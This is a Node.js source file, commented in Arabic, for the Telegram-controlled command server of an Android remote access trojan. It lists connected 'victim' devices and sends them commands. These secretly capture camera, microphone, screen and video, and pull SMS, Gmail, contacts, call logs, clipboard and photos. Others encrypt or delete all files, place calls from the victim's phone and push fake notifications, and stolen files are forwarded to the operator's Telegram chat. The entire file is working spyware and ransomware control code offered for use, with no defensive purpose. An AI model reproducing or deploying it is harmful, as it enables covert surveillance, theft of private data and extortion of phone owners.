const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// قراءة بيانات البوت من ملف JSON
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true });
const appData = new Map();

// قائمة الأوامر التي تظهر في واجهة البوت
const actions = [
    '👾 قائمة الاجهزة 📱', '📸 كيمرا خلفيه 📸', '📸 كيمرا أمامية 📸',
    '🎙 تسجيل صوت 🎙', '📞 سجل المكالمات 📞', '💬 سحب الرسائل 💬',
    '📧 سحب رسائل الجيميل 📧', '📒 سحب جهات الاتصال 📒', '📋 سجل الحافظة 📋',
    '📂 عرض جميع الملفات 📂', '🎬 سحب جميع الصور 🎬', '🗑 حذف الملفات 🗑',
    '🔊 تشغيل صوت 📢', '🔇 إيقاف الصوت 🔇', '📳 اهتزاز الجهاز 📳',
    '🛑 إيقاف الاهتزاز 🛑', '🌐 فتح رابط 🌐', '📺 لقطة شاشة 📺',
    '📽 قائمة التطبيقات 📽', '🦝 إظهار إشعار وهمي 🦝',
    '⚠️ تشفير الملفات ⚠️', '📞 اتصال من هاتف الضحية ☎️',
    '🎬 تسجيل فيديو 🎬', '🚫 فصل الجهاز 🚫'
];

// صفحة الويب الرئيسية
app.get('/', (req, res) => {
    res.send('🔹 بوت التحكم عن بعد يعمل بنجاح 🔹');
});

// رفع الملفات عبر البوت
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const clientName = req.headers['name'];
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `📁 تم استلام ملف: ${fileName}\nمن جهاز: ${clientName}`,
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: '*/*'
    });
    res.send('Done');
});

// التعامل مع اتصال Socket.io
io.on('connection', (socket) => {
    const deviceId = socket.handshake.headers['name'] || 'Unknown';
    const deviceName = socket.handshake.headers['model'] || 'Unknown';
    const deviceIP = socket.handshake.headers['ip'] || 'Unknown';
    socket.deviceId = deviceId;
    socket.deviceName = deviceName;

    let msg = `<b>👾 جهاز جديد متصل 👾</b>\n` +
              `<b>🆔 المعرف:</b> <code>${deviceId}</code>\n` +
              `<b>📱 الموديل:</b> <code>${deviceName}</code>\n` +
              `<b>🌐 IP:</b> <code>${deviceIP}</code>\n` +
              `<b>📅 الوقت:</b> ${new Date().toLocaleString()}\n\n`;
    bot.sendMessage(data.id, msg, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let discMsg = `<b>👾 جهاز فصل الاتصال 👾</b>\n` +
                      `<b>🆔 المعرف:</b> <code>${deviceId}</code>\n` +
                      `<b>📱 الموديل:</b> <code>${deviceName}</code>\n` +
                      `<b>🌐 IP:</b> <code>${deviceIP}</code>\n` +
                      `<b>📅 الوقت:</b> ${new Date().toLocaleString()}\n\n`;
        bot.sendMessage(data.id, discMsg, { parse_mode: 'HTML' });
    });

    socket.on('clients', (clientsList) => {
        let keyboard = [];
        let row = [];
        clientsList.forEach((client, idx) => {
            let callbackData = client.isFolder ? `${deviceId}|open-${client.name}` : `${deviceId}|file-${client.name}`;
            if (row.length === 5 || idx === clientsList.length - 1) {
                row.push({ text: client.name, callback_data: callbackData });
                keyboard.push(row);
                row = [];
            } else {
                row.push({ text: client.name, callback_data: callbackData });
            }
        });
        keyboard.push([{ text: '🔙 رجوع', callback_data: `${deviceId}|back-0` }]);
        bot.sendMessage(data.id, `<b>📂 قائمة الملفات على جهاز ${deviceId}</b>`, {
            reply_markup: { inline_keyboard: keyboard },
            parse_mode: 'HTML'
        });
    });

    socket.on('notification', (title) => {
        bot.sendMessage(data.id, `<b>🔔 إشعار من جهاز ${deviceId}</b>\n${title}`, { parse_mode: 'HTML' });
    });
});

// أوامر البوت الرئيسية
bot.on('message', (msg) => {
    const text = msg.text;

    // أمر /start
    if (text === '/start') {
        bot.sendMessage(data.id, `👾 أهلاً بك في بوت التحكم عن بعد\n✅ تم تشغيل البوت بنجاح\n\nاختر من القائمة:`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['👾 قائمة الاجهزة 📱', '🎮 قائمة التحكم 🎮'],
                    ['ℹ️ معلومات عامة ℹ️']
                ],
                resize_keyboard: true
            }
        });
    }

    // زر معلومات عامة
    else if (text === 'ℹ️ معلومات عامة ℹ️') {
        let infoMsg = `<b>ℹ️ معلومات البوت</b>\n\n` +
                     `<b>📊 عدد الأجهزة المتصلة:</b> ${io.sockets.sockets.size}\n` +
                     `<b>🕒 وقت التشغيل:</b> ${new Date().toLocaleString()}\n` +
                     `<b>⚡ حالة البوت:</b> نشط ✅\n\n` +
                     `<b>🔹 الأوامر المتاحة:</b>\n` +
                     `- 📸 التقاط صور (أمامية/خلفية)\n` +
                     `- 🎙 تسجيل الصوت\n` +
                     `- 📞 سجل المكالمات\n` +
                     `- 💬 سحب الرسائل\n` +
                     `- 📒 جهات الاتصال\n` +
                     `- 📂 إدارة الملفات\n` +
                     `- والمزيد...`;
        
        bot.sendMessage(data.id, infoMsg, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['👾 قائمة الاجهزة 📱', '🎮 قائمة التحكم 🎮'],
                    ['🔙 رجوع للقائمة الرئيسية 🔙']
                ],
                resize_keyboard: true
            }
        });
    }

    // زر الرجوع للقائمة الرئيسية
    else if (text === '🔙 رجوع للقائمة الرئيسية 🔙') {
        bot.sendMessage(data.id, `👾 تم الرجوع للقائمة الرئيسية`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['👾 قائمة الاجهزة 📱', '🎮 قائمة التحكم 🎮'],
                    ['ℹ️ معلومات عامة ℹ️']
                ],
                resize_keyboard: true
            }
        });
    }

    // زر قائمة التحكم - يعرض الأجهزة المتصلة
    else if (text === '🎮 قائمة التحكم 🎮') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, `⚠️ لا يوجد أي جهاز متصل حاليًا`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['👾 قائمة الاجهزة 📱', 'ℹ️ معلومات عامة ℹ️'],
                        ['🔙 رجوع للقائمة الرئيسية 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            // إنشاء أزرار بأسماء الأجهزة المتصلة
            let deviceButtons = [];
            io.sockets.sockets.forEach((socket, id) => {
                deviceButtons.push([{ text: `📱 ${socket.deviceName} (${socket.deviceId})` }]);
            });
            deviceButtons.push(['🔙 رجوع للقائمة الرئيسية 🔙']);
            
            bot.sendMessage(data.id, `🎮 <b>اختر الجهاز للتحكم به:</b>\n\nعدد الأجهزة المتصلة: ${io.sockets.sockets.size}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: deviceButtons,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    }

    // التعامل مع اختيار جهاز معين من قائمة التحكم
    else if (text.startsWith('📱 ')) {
        let deviceInfo = text.replace('📱 ', '');
        let targetSocketId = null;
        
        io.sockets.sockets.forEach((socket, id) => {
            if (`${socket.deviceName} (${socket.deviceId})` === deviceInfo) {
                targetSocketId = id;
            }
        });
        
        if (targetSocketId) {
            appData.set('currentSocket', targetSocketId);
            let selectedDevice = io.sockets.sockets.get(targetSocketId);
            
            bot.sendMessage(data.id, `✅ <b>تم اختيار الجهاز:</b> ${selectedDevice.deviceName}\n🆔 <b>المعرف:</b> ${selectedDevice.deviceId}\n\n🎮 <b>اختر الأمر الذي تريد تنفيذه:</b>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['📸 كيمرا خلفيه 📸', '📸 كيمرا أمامية 📸'],
                        ['🎙 تسجيل صوت 🎙', '🎬 تسجيل فيديو 🎬'],
                        ['📺 لقطة شاشة 📺', '📂 عرض جميع الملفات 📂'],
                        ['🎬 سحب جميع الصور 🎬', '📽 قائمة التطبيقات 📽'],
                        ['📞 سجل المكالمات 📞', '💬 سحب الرسائل 💬'],
                        ['📒 سحب جهات الاتصال 📒', '📋 سجل الحافظة 📋'],
                        ['📧 سحب رسائل الجيميل 📧', '🦝 إظهار إشعار وهمي 🦝'],
                        ['🌐 فتح رابط 🌐', '📞 اتصال من هاتف الضحية ☎️'],
                        ['🔊 تشغيل صوت 📢', '🔇 إيقاف الصوت 🔇'],
                        ['📳 اهتزاز الجهاز 📳', '🛑 إيقاف الاهتزاز 🛑'],
                        ['⚠️ تشفير الملفات ⚠️', '🗑 حذف الملفات 🗑'],
                        ['🚫 فصل الجهاز 🚫'],
                        ['🔙 رجوع للأجهزة 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            bot.sendMessage(data.id, `⚠️ خطأ في اختيار الجهاز، حاول مجدداً`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['👾 قائمة الاجهزة 📱', '🎮 قائمة التحكم 🎮'],
                        ['🔙 رجوع للقائمة الرئيسية 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        }
    }

    // الرجوع لقائمة الأجهزة من قائمة التحكم
    else if (text === '🔙 رجوع للأجهزة 🔙') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, `⚠️ لا يوجد أي جهاز متصل حاليًا`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['👾 قائمة الاجهزة 📱', 'ℹ️ معلومات عامة ℹ️'],
                        ['🔙 رجوع للقائمة الرئيسية 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            let deviceButtons = [];
            io.sockets.sockets.forEach((socket, id) => {
                deviceButtons.push([{ text: `📱 ${socket.deviceName} (${socket.deviceId})` }]);
            });
            deviceButtons.push(['🔙 رجوع للقائمة الرئيسية 🔙']);
            
            bot.sendMessage(data.id, `🎮 <b>اختر الجهاز للتحكم به:</b>\n\nعدد الأجهزة المتصلة: ${io.sockets.sockets.size}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: deviceButtons,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    }

    // القائمة الرئيسية: قائمة الأجهزة
    else if (text === '👾 قائمة الاجهزة 📱') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, `⚠️ لا يوجد أي جهاز متصل حاليًا`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['🎮 قائمة التحكم 🎮', 'ℹ️ معلومات عامة ℹ️'],
                        ['🔙 رجوع للقائمة الرئيسية 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            let deviceListMsg = `<b>📱 قائمة الأجهزة المتصلة (${io.sockets.sockets.size}):</b>\n\n`;
            let counter = 1;
            io.sockets.sockets.forEach((socket, id) => {
                deviceListMsg += `${counter++}. 🆔 <b>المعرف:</b> <code>${socket.deviceId}</code>\n` +
                                `📱 <b>الموديل:</b> ${socket.deviceName}\n` +
                                `🌐 <b>IP:</b> <code>${socket.handshake.headers['ip']}</code>\n` +
                                `🕒 <b>وقت الاتصال:</b> ${new Date().toLocaleString()}\n\n`;
            });
            
            bot.sendMessage(data.id, deviceListMsg, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['🎮 قائمة التحكم 🎮', 'ℹ️ معلومات عامة ℹ️'],
                        ['🔙 رجوع للقائمة الرئيسية 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        }
    }

    // التعامل مع اختيار جهاز معين (للتوافق مع الكود القديم)
    else if (appData.get('currentAct') === 'selectDevice') {
        let chosenDevice = msg.text;
        let targetSocketId = appData.get('currentSocket');
        io.to(targetSocketId).emit('message', {
            request: 'execCommand',
            extras: [{ key: 'command', value: chosenDevice }]
        });
        appData.delete('targetSocket');
        appData.delete('currentAct');
        bot.sendMessage(data.id, `✅ تم إرسال الأمر إلى الجهاز`, { parse_mode: 'HTML' });
    }

    // إدخال رقم الهاتف للمكالمة
    else if (appData.get('currentAct') === 'waitingNumber') {
        let number = msg.text;
        let targetSocket = appData.get('currentSocket');
        io.to(targetSocket).emit('message', {
            request: 'makeCall',
            extras: [{ key: 'number', value: number }]
        });
        appData.delete('currentSocket');
        appData.delete('currentAct');
        bot.sendMessage(data.id, `📞 جاري الاتصال بالرقم ${number}`, { parse_mode: 'HTML' });
    }

    // إدخال رابط URL
    else if (appData.get('currentAct') === 'waitingUrl') {
        let url = msg.text;
        let targetSocket = appData.get('currentSocket');
        io.to(targetSocket).emit('message', {
            request: 'openUrl',
            extras: [{ key: 'url', value: url }]
        });
        appData.delete('currentSocket');
        appData.delete('currentAct');
        bot.sendMessage(data.id, `✅ تم فتح الرابط على الجهاز`, { parse_mode: 'HTML' });
    }

    // إدخال نص الإشعار
    else if (appData.get('currentAct') === 'waitingNotiText') {
        let notiText = msg.text;
        let targetSocket = appData.get('currentSocket');
        io.to(targetSocket).emit('message', {
            request: 'fakeNotification',
            extras: [{ key: 'title', value: notiText }]
        });
        appData.delete('currentSocket');
        appData.delete('currentAct');
        bot.sendMessage(data.id, `✅ تم إرسال الإشعار الوهمي`, { parse_mode: 'HTML' });
    }

    // إدخال نص الرسالة القصيرة (SMS)
    else if (appData.get('currentAct') === 'waitingSms') {
        let smsText = msg.text;
        let targetSocket = appData.get('currentSocket');
        io.to(targetSocket).emit('message', {
            request: 'sendSms',
            extras: [{ key: 'text', value: smsText }]
        });
        appData.delete('currentSocket');
        appData.delete('currentAct');
        bot.sendMessage(data.id, `✅ تم إرسال الرسالة النصية`, { parse_mode: 'HTML' });
    }

    // إدخال رقم الـ SMS
    else if (appData.get('currentAct') === 'waitingSmsNumber') {
        let smsNumber = msg.text;
        appData.set('smsNumber', smsNumber);
        appData.set('currentAct', 'waitingSms');
        bot.sendMessage(data.id, `📝 أرسل الآن نص الرسالة التي تريد إرسالها إلى الرقم ${smsNumber}`, {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [['🔙 إلغاء']], resize_keyboard: true, one_time_keyboard: true }
        });
    }

    // أوامر التحكم (كيمرا، صوت، ملفات...)
    else if (actions.includes(text)) {
        let targetSocketId = appData.get('currentSocket');
        let targetDevice = io.sockets.sockets.get(targetSocketId);
        if (!targetDevice) {
            bot.sendMessage(data.id, `⚠️ الجهاز غير متصل حاليًا، اختر جهازًا أولاً من قائمة التحكم`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['🎮 قائمة التحكم 🎮', '👾 قائمة الاجهزة 📱'],
                        ['🔙 رجوع للقائمة الرئيسية 🔙']
                    ],
                    resize_keyboard: true
                }
            });
            return;
        }

        switch (text) {
            case '📸 كيمرا خلفيه 📸':
                io.to(targetSocketId).emit('message', { request: 'backCamera', extras: [] });
                bot.sendMessage(data.id, `✅ جاري التقاط صورة بالكاميرا الخلفية...`, { parse_mode: 'HTML' });
                break;
            case '📸 كيمرا أمامية 📸':
                io.to(targetSocketId).emit('message', { request: 'frontCamera', extras: [] });
                bot.sendMessage(data.id, `✅ جاري التقاط صورة بالكاميرا الأمامية...`, { parse_mode: 'HTML' });
                break;
            case '🎙 تسجيل صوت 🎙':
                io.to(targetSocketId).emit('message', { request: 'startRecord', extras: [] });
                bot.sendMessage(data.id, `✅ جاري تسجيل الصوت...`, { parse_mode: 'HTML' });
                break;
            case '🎬 تسجيل فيديو 🎬':
                io.to(targetSocketId).emit('message', { request: 'startVideoRecord', extras: [] });
                bot.sendMessage(data.id, `✅ جاري تسجيل الفيديو...`, { parse_mode: 'HTML' });
                break;
            case '📺 لقطة شاشة 📺':
                io.to(targetSocketId).emit('message', { request: 'takeScreenshot', extras: [] });
                bot.sendMessage(data.id, `✅ جاري التقاط لقطة الشاشة...`, { parse_mode: 'HTML' });
                break;
            case '🔊 تشغيل صوت 📢':
                io.to(targetSocketId).emit('message', { request: 'playAudio', extras: [] });
                bot.sendMessage(data.id, `✅ تم تشغيل الصوت`, { parse_mode: 'HTML' });
                break;
            case '🔇 إيقاف الصوت 🔇':
                io.to(targetSocketId).emit('message', { request: 'stopAudio', extras: [] });
                bot.sendMessage(data.id, `✅ تم إيقاف الصوت`, { parse_mode: 'HTML' });
                break;
            case '📳 اهتزاز الجهاز 📳':
                io.to(targetSocketId).emit('message', { request: 'vibrate', extras: [] });
                bot.sendMessage(data.id, `✅ جاري اهتزاز الجهاز...`, { parse_mode: 'HTML' });
                break;
            case '🛑 إيقاف الاهتزاز 🛑':
                io.to(targetSocketId).emit('message', { request: 'stopVibrate', extras: [] });
                bot.sendMessage(data.id, `✅ تم إيقاف الاهتزاز`, { parse_mode: 'HTML' });
                break;
            case '📞 سجل المكالمات 📞':
                io.to(targetSocketId).emit('message', { request: 'getCalls', extras: [] });
                bot.sendMessage(data.id, `✅ جاري سحب سجل المكالمات...`, { parse_mode: 'HTML' });
                break;
            case '💬 سحب الرسائل 💬':
                io.to(targetSocketId).emit('message', { request: 'getSms', extras: [] });
                bot.sendMessage(data.id, `✅ جاري سحب الرسائل...`, { parse_mode: 'HTML' });
                break;
            case '📧 سحب رسائل الجيميل 📧':
                io.to(targetSocketId).emit('message', { request: 'getGmail', extras: [] });
                bot.sendMessage(data.id, `✅ جاري سحب رسائل الجيميل...`, { parse_mode: 'HTML' });
                break;
            case '📒 سحب جهات الاتصال 📒':
                io.to(targetSocketId).emit('message', { request: 'getContacts', extras: [] });
                bot.sendMessage(data.id, `✅ جاري سحب جهات الاتصال...`, { parse_mode: 'HTML' });
                break;
            case '📋 سجل الحافظة 📋':
                io.to(targetSocketId).emit('message', { request: 'getClipboard', extras: [] });
                bot.sendMessage(data.id, `✅ جاري سحب سجل الحافظة...`, { parse_mode: 'HTML' });
                break;
            case '📂 عرض جميع الملفات 📂':
                io.to(targetSocketId).emit('message', { request: 'listFiles', extras: [] });
                bot.sendMessage(data.id, `✅ جاري عرض الملفات...`, { parse_mode: 'HTML' });
                break;
            case '🎬 سحب جميع الصور 🎬':
                io.to(targetSocketId).emit('message', { request: 'getGallery', extras: [] });
                bot.sendMessage(data.id, `✅ جاري سحب الصور...`, { parse_mode: 'HTML' });
                break;
            case '📽 قائمة التطبيقات 📽':
                io.to(targetSocketId).emit('message', { request: 'getApps', extras: [] });
                bot.sendMessage(data.id, `✅ جاري جلب قائمة التطبيقات...`, { parse_mode: 'HTML' });
                break;
            case '⚠️ تشفير الملفات ⚠️':
                io.to(targetSocketId).emit('message', { request: 'encryptFiles', extras: [] });
                bot.sendMessage(data.id, `✅ جاري تشفير الملفات...`, { parse_mode: 'HTML' });
                break;
            case '🗑 حذف الملفات 🗑':
                bot.sendMessage(data.id, `⚠️ سيتم حذف جميع الملفات على الجهاز، اكتب "موافق" للتأكيد`, { parse_mode: 'HTML' });
                appData.set('currentAct', 'confirmDelete');
                break;
            case '🌐 فتح رابط 🌐':
                appData.set('currentAct', 'waitingUrl');
                bot.sendMessage(data.id, `🔗 أرسل الرابط الذي تريد فتحه على جهاز الضحية`, {
                    parse_mode: 'HTML',
                    reply_markup: { keyboard: [['🔙 إلغاء']], resize_keyboard: true, one_time_keyboard: true }
                });
                break;
            case '📞 اتصال من هاتف الضحية ☎️':
                appData.set('currentAct', 'waitingNumber');
                bot.sendMessage(data.id, `📞 أرسل رقم الهاتف الذي تريد الاتصال به`, {
                    parse_mode: 'HTML',
                    reply_markup: { keyboard: [['🔙 إلغاء']], resize_keyboard: true, one_time_keyboard: true }
                });
                break;
            case '🦝 إظهار إشعار وهمي 🦝':
                appData.set('currentAct', 'waitingNotiText');
                bot.sendMessage(data.id, `✏️ أرسل نص الإشعار الوهمي الذي سيظهر على الجهاز`, {
                    parse_mode: 'HTML',
                    reply_markup: { keyboard: [['🔙 إلغاء']], resize_keyboard: true, one_time_keyboard: true }
                });
                break;
            case '🚫 فصل الجهاز 🚫':
                io.to(targetSocketId).emit('message', { request: 'disconnectDevice', extras: [] });
                appData.delete('currentSocket');
                bot.sendMessage(data.id, `✅ تم فصل الجهاز`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['👾 قائمة الاجهزة 📱', '🎮 قائمة التحكم 🎮'],
                            ['🔙 رجوع للقائمة الرئيسية 🔙']
                        ],
                        resize_keyboard: true
                    }
                });
                break;
            default:
                bot.sendMessage(data.id, `⚠️ أمر غير معروف`, { parse_mode: 'HTML' });
        }
    }

    // تأكيد الحذف
    else if (text === 'موافق' && appData.get('currentAct') === 'confirmDelete') {
        let targetSocket = appData.get('currentSocket');
        io.to(targetSocket).emit('message', { request: 'deleteAllFiles', extras: [] });
        appData.delete('currentAct');
        bot.sendMessage(data.id, `✅ تم حذف جميع الملفات`, { parse_mode: 'HTML' });
    }

    // إلغاء العملية الحالية
    else if (text === '🔙 إلغاء') {
        appData.delete('currentAct');
        appData.delete('currentSocket');
        bot.sendMessage(data.id, `❌ تم إلغاء العملية`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['👾 قائمة الاجهزة 📱', '🎮 قائمة التحكم 🎮'],
                    ['ℹ️ معلومات عامة ℹ️']
                ],
                resize_keyboard: true
            }
        });
    }

    // اختيار جهاز معين من قائمة الأجهزة (للتوافق)
    else {
        let targetSocketId = null;
        io.sockets.sockets.forEach((socket, id) => {
            if (socket.deviceId === text) {
                targetSocketId = id;
            }
        });
        if (targetSocketId) {
            appData.set('currentSocket', targetSocketId);
            bot.sendMessage(data.id, `✅ تم اختيار الجهاز: ${text}\nالآن يمكنك إرسال أحد أوامر التحكم`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['📸 كيمرا خلفيه 📸', '📸 كيمرا أمامية 📸'],
                        ['🎙 تسجيل صوت 🎙', '🎬 تسجيل فيديو 🎬'],
                        ['📺 لقطة شاشة 📺', '📂 عرض جميع الملفات 📂'],
                        ['🎬 سحب جميع الصور 🎬', '📽 قائمة التطبيقات 📽'],
                        ['📞 سجل المكالمات 📞', '💬 سحب الرسائل 💬'],
                        ['📒 سحب جهات الاتصال 📒', '📋 سجل الحافظة 📋'],
                        ['📧 سحب رسائل الجيميل 📧', '🦝 إظهار إشعار وهمي 🦝'],
                        ['🌐 فتح رابط 🌐', '📞 اتصال من هاتف الضحية ☎️'],
                        ['🔊 تشغيل صوت 📢', '🔇 إيقاف الصوت 🔇'],
                        ['📳 اهتزاز الجهاز 📳', '🛑 إيقاف الاهتزاز 🛑'],
                        ['⚠️ تشفير الملفات ⚠️', '🗑 حذف الملفات 🗑'],
                        ['🚫 فصل الجهاز 🚫'],
                        ['🔙 رجوع للأجهزة 🔙']
                    ],
                    resize_keyboard: true
                }
            });
        }
    }
});

// معالجة استدعاءات الأزرار (callback_query)
bot.on('callback_query', (query) => {
    let queryData = query.data;
    let parts = queryData.split('|');
    let deviceId = parts[0];
    let action = parts[1];
    let target = parts[2];

    if (action === 'back-0') {
        io.sockets.sockets.forEach((socket, id) => {
            if (socket.deviceId === deviceId) {
                io.to(id).emit('message', { request: 'goBack', extras: [] });
            }
        });
    } else if (action === 'cd-') {
        io.sockets.sockets.forEach((socket, id) => {
            if (socket.deviceId === deviceId) {
                io.to(id).emit('message', { request: 'cd', extras: [{ key: 'path', value: target }] });
            }
        });
    } else if (action === 'delete-') {
        io.sockets.sockets.forEach((socket, id) => {
            if (socket.deviceId === deviceId) {
                io.to(id).emit('message', { request: 'delete', extras: [{ key: 'path', value: target }] });
            }
        });
    } else if (action === 'upload-') {
        bot.editMessageText(`📤 جاري رفع الملف: ${target}`, {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ تم', callback_data: `${deviceId}|back-0` }
                ]]
            },
            parse_mode: 'HTML'
        });
    }
});

// إرسال أمر ping بشكل دوري للحفاظ على الاتصال
setInterval(() => {
    io.sockets.sockets.forEach((socket, id) => {
        io.to(id).emit('ping', {});
    });
}, 3000);

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ البوت يعمل على منفذ ${PORT}`);
});
